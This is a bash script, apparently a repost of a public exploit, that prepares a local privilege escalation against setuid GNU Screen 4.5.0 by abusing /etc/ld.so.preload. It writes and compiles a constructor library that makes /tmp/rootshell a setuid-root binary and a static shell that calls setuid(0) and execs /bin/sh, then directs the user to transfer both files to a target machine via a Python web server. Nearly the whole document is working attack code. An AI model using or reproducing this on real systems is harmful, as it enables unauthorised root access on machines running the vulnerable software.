#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# Twitter: @YasserREED
# HACK THE PLANET
# ~ infodox (25/1/2017)

echo "···············································································································"
echo ":                                                    _  _      ____     ___                       _           :"
echo ":    ___   ___  _ __  ___   ___  _ __        __   __| || |    | ___|   / _ \         _ __   _ __ (_)__   __   :"
echo ":   / __| / __|| '__|/ _ \ / _ \| '_ \  _____\ \ / /| || |_   |___ \  | | | | _____ | '_ \ | '__|| |\ \ / /   :"
echo ":   \__ \| (__ | |  |  __/|  __/| | | ||_____|\ V / |__   _|_  ___) |_| |_| ||_____|| |_) || |   | | \ V /    :"
echo ":   |___/ \___||_|   \___| \___||_| |_|        \_/     |_| (_)|____/(_)\___/        | .__/ |_|   |_|  \_/     :"
echo ":                                                                                   |_|                       :"
echo ":                                                                                                             :"
echo ":                                                                               X : @YasserREED               :"
echo ":··············································································································"

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c                            
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
echo "[+] libhax.c Created .."

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
echo "[+] Create /tmp/libhax.so .."
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF

echo "[+] Create /tmp/rootshell .."
gcc -o /tmp/rootshell /tmp/rootshell.c  -static
rm -f /tmp/rootshell.c

echo "[+] Setup Finished!"

echo "[+] Entering /tmp Folder"
cd /tmp || { echo "Failed to enter /tmp folder"; exit 1; }
echo ""
echo "[+] Move libhax.so and rootshell to the Target Machine"
echo ""
echo ""
echo "[Hint] You can use the below command to transfer the files"
echo "[Command] python3 -m http.server 80"

exec /bin/bash